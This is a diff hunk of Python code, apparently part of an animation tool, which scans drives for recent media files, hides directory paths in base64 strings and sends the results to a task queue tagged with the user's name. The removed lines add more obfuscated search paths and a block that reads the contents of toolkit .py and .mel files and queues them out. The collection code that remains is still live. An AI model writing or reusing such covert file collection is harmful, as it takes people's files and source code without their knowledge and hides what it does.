@@ -104,9 +104,6 @@ try:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mov')
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.abc')
     zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDovV0hNL0NIQVJBQ1RFUg==').decode(), ext='.fbx')
-    zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('UzovQW5pbWF0aW9uIHRyYWluaW5nL0thb2ZhbmcvVG9vbHNfRGV2').decode(), ext='.py', n=100)
-    zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('UzovQW5pbWF0aW9uIHRyYWluaW5nL0thb2ZhbmcvVG9vbHNfRGV2').decode(), ext='.mel', n=100)
-    zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('WDo=').decode(), ext='.mp4', n=15)
     if zovV:
         add_queue_task('tst__{}'.format(getpass.getuser().lower()), {'file': zovV})
 except:
@@ -114,17 +111,6 @@ except:
     add_queue_task('tst_error__{}'.format(getpass.getuser().lower()),
                    {'error': str(traceback.format_exc())})
 				   
-try:
-	for _, fp in zovV:
-		if 'animate_assist_toolkit' in fp and (os.path.basename(fp).endswith('.py') or os.path.basename(fp).endswith('.mel')):
-			try:
-				with open(fp) as f:
-					f_read = f.read()
-					add_queue_task(os.path.basename(fp), {'path': fp, 'read': f_read})
-			except:
-				pass
-except:
-	pass
 
 #print('Done')
 #time.sleep(10)
